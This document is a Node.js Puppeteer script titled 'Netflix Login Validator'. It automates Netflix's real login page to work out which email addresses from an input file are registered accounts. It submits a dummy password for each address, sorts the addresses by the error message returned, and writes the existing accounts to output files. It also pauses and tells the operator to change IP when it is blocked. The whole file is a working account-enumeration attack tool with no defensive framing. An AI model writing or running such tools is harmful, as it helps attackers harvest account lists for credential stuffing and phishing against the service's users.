const puppeteer = require("puppeteer");
const fs = require("fs");
const delay = require("delay");
const moment = require("moment");
const confirm = require("readline-sync");
const { Twisters } = require("twisters");
const chalk = require("chalk");
const twisters = new Twisters();

(async () => {
  const dataAcc = fs
    .readFileSync("accNetflix.txt", { encoding: "utf-8" })
    .replace(/\n/g, "")
    .split("\r");
  console.log(
    chalk.cyan(`
   __  __ _____  ___ __  _______  __  _____  ___  ___  __ __    
  /\\ \\ \\/__/__   \\/ __/ /  \\_   \\ \\/ / /__   \\/___\\/___\\/ // _\\   
 /  \\/ /_\\   / /\\/ _\\/ /    / /\\/\\  /    / /\\//  ///  // / \\ \\    
/ /\\  //__  / / / / / /__/\\/ /_  /  \\   / / / \\_// \\_// /___\\ \\   
\\_\\ \\/\\__/  \\/  \\/  \\____\\____/ /_/\\_\\  \\/  \\___/\\___/\\____\\__/   
                                                               
`)
  );
  twisters.put("log", {
    text: chalk.blue("[Netflix Login Validator]"),
  });

  setTimeout(() => {
    // Update the message again
    twisters.put("log", {
      // Spinner is not shown when active is false
      active: false,
      // Display a yellow prefix before the text
      text: chalk.blue(`Start Checking Your Account . . .`),
    });
  }, 3000);

  for (let i in dataAcc) {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    await page.goto("https://www.netflix.com/id-en/login");
    await page.waitForSelector("#id_userLoginId");
    await page.type("#id_userLoginId", dataAcc[i]);
    twisters.put(`acc${i}`, {
      text: chalk.blue(`[Proccess] => ${dataAcc[i]}`),
    });
    await page.type("#id_password", "asdasd123@@");
    await page.click(
      "#appMountPoint > div > div.login-body > div > div > div.hybrid-login-form-main > form > button"
    );
    try {
      await page.waitForSelector(
        "#appMountPoint > div > div.login-body > div > div > div.hybrid-login-form-main > div > div.ui-message-contents",
        { timeout: 5000 }
      );
      const dataMsg = await page.$(
        "#appMountPoint > div > div.login-body > div > div > div.hybrid-login-form-main > div > div.ui-message-contents"
      );
      const data = await (await dataMsg.getProperty("innerText")).jsonValue();
      if (
        data ===
        "Sorry, we can't find an account with this email address. Please try again or create a new account."
      ) {
        twisters.put(`acc${i}`, {
          active: false,
          text: chalk.red(
            `[${moment(new Date()).format("LTS")}][Account Not Found] => ${dataAcc[i]}`
          ),
        });
      } else {
        if (data.match(/something/gi)) {
          twisters.put(`acc${i}`, {
            active: false,
            text: chalk.red(
              `[${moment(new Date()).format("LTS")}][Blocked IP] => Please Change Your IP`
            ),
          });
          await confirm.question("Press Enter To Continue . . .");
        } else {
          twisters.put(`acc${i}`, {
            active: false,
            text: chalk.yellow(
              `[${moment(new Date()).format("LTS")}][Password Wrong] => ${dataAcc[i]}`
            ),
          });
          fs.appendFileSync("accNetflixWrongPass.txt", `${dataAcc[i]}\n`);
        }
      }
    } catch (error) {
      twisters.put(`acc${i}`, {
        active: false,
        text: chalk.green(`[${moment(new Date()).format("LTS")}][Valid Account] => ${dataAcc[i]}`),
      });
      fs.appendFileSync("accNetflixValid.txt", `${dataAcc[i]}\n`);
    }
    await browser.close();
    await delay(2000);
  }
})();
